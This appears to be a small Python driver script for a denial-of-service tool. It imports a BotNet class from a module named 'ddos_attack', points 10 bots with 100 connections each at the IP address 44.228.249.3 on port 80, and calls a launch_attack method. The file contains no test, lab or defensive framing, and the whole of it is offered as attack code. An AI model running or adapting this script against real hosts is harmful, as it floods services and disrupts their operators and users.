from src.ddos_attack import BotNet  # change this to import from panthon

botnet = BotNet(
    10, "44.228.249.3", 80, 100
)  # num of bots, target IP, target port, connections per bot
botnet.create_bots()
botnet.launch_attack()
